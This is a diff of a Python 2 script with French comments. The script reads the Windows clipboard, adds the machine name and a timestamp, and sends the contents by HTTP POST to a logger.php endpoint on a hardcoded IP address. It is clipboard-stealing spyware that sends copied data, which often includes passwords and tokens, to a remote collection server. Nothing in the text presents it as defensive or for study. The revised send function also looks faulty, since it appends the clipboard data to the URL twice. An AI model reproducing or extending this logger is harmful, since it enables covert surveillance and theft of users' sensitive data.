@@ -6,30 +6,27 @@ import time
 import os
 
 
-# Variables
-date = time.strftime("%Y%m%d_%H%M")
-pc_name = os.environ['COMPUTERNAME']
-clip_name = pc_name + "_" + date + '.txt'
-
-
-
 def get_clip():
+    # Variables
+    date = time.strftime("%Y%m%d_%H%M%S")
+    pc_name = os.environ['COMPUTERNAME']
+    clip_name = pc_name + "_" + date + '\n'
     global data
+    global donnees
+    # Ouverture du Clipboard
     clip.OpenClipboard()
+    # Récupération du contenu du clipboard
     data = clip.GetClipboardData()
+    # Fermeture du clipboard pour ne pas impacter la fonction
     clip.CloseClipboard()
-    print data
-    f = open(clip_name, "a+")
-    f.write(data)
-    #f.close()
-    return f
-
+    donnees = (clip_name + data).replace('\n', '|| ')
+    print donnees
 
 def send(f):
     # AVEC REQUESTS
-    url = 'http://192.168.35.68:8080/logger.php?log=' + clip_name + data
-    query = {'clipboard': data}
-    res = requests.post(url, data=query)
+    url = 'http://192.168.35.68:8080/logger.php?log=' + data
+    url_log = url + data
+    res = requests.post(url_log, data=data)
     print(res.text)
 
 
